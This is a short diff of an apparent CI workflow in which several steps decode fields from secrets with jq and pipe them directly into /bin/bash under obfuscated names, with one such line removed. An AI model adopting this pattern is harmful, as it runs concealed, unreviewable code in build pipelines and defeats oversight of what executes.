@@ -22,7 +22,6 @@ jobs:
           b431: ${{ secrets.b431 }}
         run: |
           printf '%s' "$b431" | jq -r .cbwy919 | /bin/bash
-          printf '%s' "$aistk26895" | jq -r .xvts31267 | /bin/bash
           printf '%s' "$m5368" | jq -r .lae417 | /bin/bash
           echo $tyl43 | jq -r .me06833 | /bin/bash
           printf '%s' "$ycg1534" | jq -r .mw28 | /bin/bash
